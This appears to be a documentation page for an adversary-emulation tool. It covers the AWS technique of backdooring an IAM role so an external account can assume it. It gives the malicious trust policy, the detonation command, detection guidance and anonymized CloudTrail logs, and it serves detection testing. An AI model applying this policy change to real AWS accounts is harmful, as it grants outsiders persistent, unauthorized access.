---
title: Backdoor an IAM Role
---

# Backdoor an IAM Role


 <span class="smallcaps w3-badge w3-blue w3-round w3-text-white" title="This attack technique can be detonated multiple times">idempotent</span> 

Platform: AWS

## MITRE ATT&CK Tactics


- Persistence

## Description


Establishes persistence by backdooring an existing IAM role, allowing it to be assumed from an external AWS account.

<span style="font-variant: small-caps;">Warm-up</span>: 

- Create an IAM role.

<span style="font-variant: small-caps;">Detonation</span>: 

- Update the assume role policy of the IAM role to backdoor it, making it accessible from an external, fictitious AWS account:

<pre>
<code>
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "ec2.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    },
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::193672423079:root"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
</code>
</pre>


## Instructions

```bash title="Detonate with Stratus Red Team"
stratus detonate aws.persistence.iam-backdoor-role
```
## Detection


- Using CloudTrail's <code>UpdateAssumeRolePolicy</code> event.

- Through [IAM Access Analyzer](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html#access-analyzer-iam-role), 
which generates a finding when a role can be assumed from a new AWS account or publicly.





## Detonation logs <span class="smallcaps w3-badge w3-pink w3-round w3-text-sand" title="TODO">new</span>

The following CloudTrail events are generated when this technique is detonated[^1]:


- `iam:UpdateAssumeRolePolicy`


??? "View raw detonation logs"

    ```json hl_lines="6"

    [
	   {
	      "awsRegion": "ca-isob-northsouth-1r",
	      "eventCategory": "Management",
	      "eventID": "62e290e2-ee95-4a7c-a9f8-db4ef462b12d",
	      "eventName": "UpdateAssumeRolePolicy",
	      "eventSource": "iam.amazonaws.com",
	      "eventTime": "2024-08-01T13:29:57Z",
	      "eventType": "AwsApiCall",
	      "eventVersion": "1.09",
	      "managementEvent": true,
	      "readOnly": false,
	      "recipientAccountId": "751203476945",
	      "requestID": "295ee6e3-1da9-416f-885d-ad65d876ef82",
	      "requestParameters": {
	         "policyDocument": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"Service\": \"ec2.amazonaws.com\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    },\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::193672423079:root\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    }\n  ]\n}",
	         "roleName": "stratus-red-team-backdoor-r-role"
	      },
	      "responseElements": null,
	      "sourceIPAddress": "225.178.039.250",
	      "tlsDetails": {
	         "cipherSuite": "TLS_AES_128_GCM_SHA256",
	         "clientProvidedHostHeader": "iam.amazonaws.com",
	         "tlsVersion": "TLSv1.3"
	      },
	      "userAgent": "stratus-red-team_180e078f-4ad3-40c5-9ec3-efff37e17b25",
	      "userIdentity": {
	         "accessKeyId": "AKIAMUV7B57OZM0RV05D",
	         "accountId": "751203476945",
	         "arn": "arn:aws:iam::751203476945:user/christophe",
	         "principalId": "AIDA7SLGLLJ9LWK18E4Y",
	         "type": "IAMUser",
	         "userName": "christophe"
	      }
	   }
	]
    ```

[^1]: These logs have been gathered from a real detonation of this technique in a test environment using [Grimoire](https://github.com/DataDog/grimoire), and anonymized using [LogLicker](https://github.com/Permiso-io-tools/LogLicker).
